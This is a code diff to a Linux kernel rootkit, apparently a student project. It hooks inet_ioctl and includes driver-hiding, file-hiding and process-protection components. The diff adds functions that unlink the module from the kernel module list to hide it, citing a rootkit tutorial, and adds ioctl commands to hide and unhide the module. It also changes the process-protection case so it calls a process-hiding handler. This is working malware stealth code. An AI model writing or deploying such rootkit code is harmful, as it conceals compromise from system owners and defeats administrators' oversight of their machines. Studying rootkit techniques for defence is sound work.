@@ -4,7 +4,7 @@
 
 #include "khook/engine.c"
 
-#include "protocol.h"
+#include "../protocol.h"
 
 #include "driver_hiding/driver_hiding.h"
 #include "file_hiding/file_hiding.h"
@@ -13,6 +13,23 @@
 #include "process_protection/process_protection.h"
 
 MODULE_AUTHOR("RuanJianAnQuanYuanLiDiQiZu");
+
+// ---------------------- Module hide and unhide -- Begin ----------------------
+// see https://xcellerator.github.io/posts/linux_rootkits_05/
+
+static struct list_head *prev_module;
+
+void hide_module(void) {
+    prev_module = THIS_MODULE->list.prev;
+    list_del(&THIS_MODULE->list);
+}
+
+void unhide_module(void) {
+    if (prev_module) {
+        list_add(&THIS_MODULE->list, prev_module);
+    }
+}
+// ---------------------- Module hide and unhide -- End ----------------------
 
 static int __init on_module_init(void) {
     khook_init();
@@ -48,6 +65,15 @@ static int khook_inet_ioctl(struct socket *sock, unsigned int cmd, unsigned long
                 break;
             case 0x4:
                 // process protection
+                handle_process_hiding_request(cmd_arg.subargs);
+                break;
+            case 0x5:
+                // module hiding
+                hide_module();
+                break;
+            case 0x6:
+                // module unhiding
+                unhide_module();
                 break;
             default:
                 // not valid
